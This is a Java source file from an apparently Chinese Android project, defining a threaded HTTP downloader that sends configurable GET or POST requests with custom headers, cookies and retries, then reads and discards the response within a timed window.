package net.workspace.http;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.net.URI;
import java.util.HashMap;
import java.util.Iterator;
import net.workspace.biz.BIZ;
import net.workspace.network.NetworkController;
import net.workspace.util.MyLogger;
import net.workspace.util.T;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.ProtocolException;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.RedirectHandler;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.BasicCookieStore;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.cookie.BasicClientCookie;
import org.apache.http.protocol.HttpContext;
import android.annotation.SuppressLint;
import bean.prop.Cookie;
import bean.prop.Header;
import bean.prop.KeyValue;

@SuppressLint("DefaultLocale")
public class DownLoadThread implements Runnable {
    private HttpGet get;
    private DefaultHttpClient httpClient;
    private boolean isRedirect = false;
    private NetContext netContext;
    private HttpPost post;
    private int relinkTimes = 0;
    private int requestTimes = 1;
    private long timeOut;
    private String url;
    private String contentUrl;
    public DownLoadThread(NetContext netres) {
        netContext = netres;
        requestTimes = netres.downloadStep.times;
        timeOut = netres.downloadStep.time;
        url = netres.url;
        if (netres.variables == null) netres.variables = new HashMap<String, String>();
    }
    private void closeConnect() {
        try {
            if (get != null) {
                if (!get.isAborted()) get.abort();
                get = null;
            }
            if (post != null) {
                if (!post.isAborted()) post.abort();
                post = null;
            }
            if (httpClient != null) {
                httpClient.getConnectionManager().shutdown();
                httpClient = null;
            }
        } catch (Exception e) {
            MyLogger.error(e);
        }
    }
    private void connectFailed(String s, String s1) {
        if (netContext.netListener != null) {
            netContext.netListener.onFailed(netContext.callback, null, null);
            netContext.netListener = null;
        }
    }
    private HttpResponse executeGet() throws IOException, ClientProtocolException {
        HttpResponse httpresponse;
        contentUrl = url;
        if (netContext.downloadStep.params != null && !isRedirect) {
            StringBuffer sb = new StringBuffer();
            sb.append(url);
            sb.append("?");
            for (KeyValue kv : netContext.downloadStep.params) {
                sb.append(kv.key);
                sb.append("=");
                sb.append(T.getRuntimeValue(netContext.variables, kv.value));
                sb.append("&");
            }
            sb.deleteCharAt(-1 + sb.length());
            contentUrl = sb.toString();
        }
        MyLogger.debug(contentUrl);
        HttpGet httpget = new HttpGet(contentUrl);
        get = httpget;
        T.judgeNet(get);
        boolean flag1 = false;
        if (netContext.downloadStep.headers != null && netContext.downloadStep.headers.size() > 0) {
            for (Header myheader1 : netContext.downloadStep.headers) {
                get.setHeader(myheader1.name, T.getRuntimeValue(netContext.variables, myheader1.value));
                if (myheader1.name.equalsIgnoreCase("USER-AGENT")) flag1 = true;
            }
        } else {
            flag1 = true;
            if (T.INFO.userAgent != null && !T.INFO.userAgent.equals("")) get.setHeader("User-Agent", T.INFO.userAgent);
            get.setHeader("Content-Type", "text/html");
            get.setHeader("Accept-Charset", "iso-8859-1, utf-8; q=0.7, *; q=0.7");
            get.setHeader("Accept-Language", "zh-cn, zh;q=1.0,en;q=0.5");
        }
        if (!flag1 && T.INFO.userAgent != null && !T.INFO.userAgent.equals("")) get.setHeader("User-Agent", T.INFO.userAgent);
        httpresponse = httpClient.execute(get);
        return httpresponse;
    }
    private HttpResponse executePost() throws UnsupportedEncodingException, IOException, ClientProtocolException {
        HttpResponse httpresponse;
        boolean flag;
        contentUrl = url;
        post = new HttpPost(contentUrl);
        T.judgeNet(post);
        flag = false;
        if (netContext.downloadStep.headers != null && netContext.downloadStep.headers.size() > 0) {
            Iterator<Header> iterator1 = netContext.downloadStep.headers.iterator();
            while (iterator1.hasNext()) {
                Header myheader = iterator1.next();
                post.setHeader(myheader.name, T.getRuntimeValue(netContext.variables, myheader.value));
                if (myheader.name.toUpperCase().equals("USER-AGENT")) flag = true;
            }
        } else {
            flag = true;
            if (T.INFO.userAgent != null && !T.INFO.userAgent.equals("")) post.setHeader("User-Agent", T.INFO.userAgent);
            post.setHeader("Content-Type", "text/html");
            post.setHeader("Accept-Charset", "iso-8859-1, utf-8; q=0.7, *; q=0.7");
            post.setHeader("Accept-Language", "zh-cn, zh;q=1.0,en;q=0.5");
        }
        if (!flag && T.INFO.userAgent != null && !T.INFO.userAgent.equals("")) post.setHeader("User-Agent", T.INFO.userAgent);
        if (netContext.downloadStep.params != null) {
            StringBuffer stringbuffer = new StringBuffer();
            for (KeyValue kv : netContext.downloadStep.params) {
                stringbuffer.append(kv.key);
                stringbuffer.append("=");
                stringbuffer.append(T.getRuntimeValue(netContext.variables, kv.value));
                stringbuffer.append("&");
            }
            stringbuffer.deleteCharAt(-1 + stringbuffer.length());
            String s = stringbuffer.toString();
            HttpPost httppost = post;
            StringEntity stringentity = new StringEntity(s, "UTF-8");
            httppost.setEntity(stringentity);
        }
        httpresponse = httpClient.execute(post);
        return httpresponse;
    }
    private long readStream(InputStream inputstream, int size, long timeout) throws IOException {
        long beginTime = System.currentTimeMillis();
        long realSize = 0;
        while (inputstream.read() != -1) {
            realSize++;
            if (size > 0 && realSize >= size) break;
            if (realSize % 1024 == 0) {
                NetworkController.refreshTimer();
            }
        }
        long endTime = System.currentTimeMillis();
        if (timeout > 0L) {
            long diffTime = endTime - beginTime - 1000L * timeout;
            if (diffTime < 0L) {
                T.sleep(-diffTime);
            }
        }
        return realSize;
    }
    private void reconnect() {
        closeConnect();
        updataLoad();
    }
    @Override
    public void run() {
        updataLoad();
    }
    public void startThread() {
        new Thread(this).start();
    }
    private void updataLoad() {
        NetworkController.refreshTimer();
        relinkTimes = 1 + relinkTimes;
        try {
            MyLogger.debug(url);
            url = url.replaceAll("&amp;", "&");
            httpClient = new GzipHttpClient();
            httpClient.setRedirectHandler(new RedirectHandler() {
                @Override
                public URI getLocationURI(HttpResponse httpresponse1, HttpContext httpcontext) throws ProtocolException {
                    return null;
                }
                @Override
                public boolean isRedirectRequested(HttpResponse httpresponse1, HttpContext httpcontext) {
                    return false;
                }
            });
            if (!(netContext.downloadStep.cookies == null || netContext.downloadStep.cookies.size() <= 0 || isRedirect)) {
                BasicCookieStore basiccookiestore;
                basiccookiestore = new BasicCookieStore();
                Iterator<Cookie> iterator4 = netContext.downloadStep.cookies.iterator();
                while (iterator4.hasNext()) {
                    Cookie mycookie = iterator4.next();
                    basiccookiestore.addCookie(new BasicClientCookie(mycookie.name, T.getRuntimeValue(netContext.variables, mycookie.value)));
                }
                httpClient.setCookieStore(basiccookiestore);
            }
            HttpResponse httpresponse = "GET".equalsIgnoreCase(netContext.downloadStep.method) ? executeGet() : executePost();
            int statusCode = httpresponse.getStatusLine().getStatusCode();
            if (statusCode == 301 || statusCode == 302) {
                String location = httpresponse.getLastHeader("location").getValue();
                if (location != null) {
                    url = T.getLocationUrl(url, location);
                    requestTimes = 1;
                    isRedirect = true;
                    updataLoad();
                }
            } else {
                if (statusCode != 200) throw new IOException(new StringBuilder("HTTP response code: ").append(statusCode).toString());
            }
            HttpEntity httpentity = httpresponse.getEntity();
            if (relinkTimes < requestTimes) {
                reconnect();
            } else {
                if (httpentity != null) {
                    InputStream inputstream = httpentity.getContent();
                    long realSize = readStream(inputstream, netContext.downloadStep.size, timeOut);
                    if (netContext.netListener != null) {
                        if (realSize > 0) netContext.netListener.onSuccess(netContext.callback, contentUrl, "");
                        else netContext.netListener.onFailed(netContext.callback, "111002", "网络错误");
                        netContext.netListener = null;
                    }
                    inputstream.close();
                } else {
                    if (netContext.netListener != null) {
                        netContext.netListener.onFailed(netContext.callback, "111002", "网络错误");
                        netContext.netListener = null;
                    }
                }
            }
            closeConnect();
        } catch (Exception e) {
            MyLogger.error(e);
            if (relinkTimes < BIZ.RETRY_TIMES) reconnect();
            else {
                relinkTimes = 0;
                connectFailed("Exception", e.toString());
            }
            closeConnect();
        }
        return;
    }
}
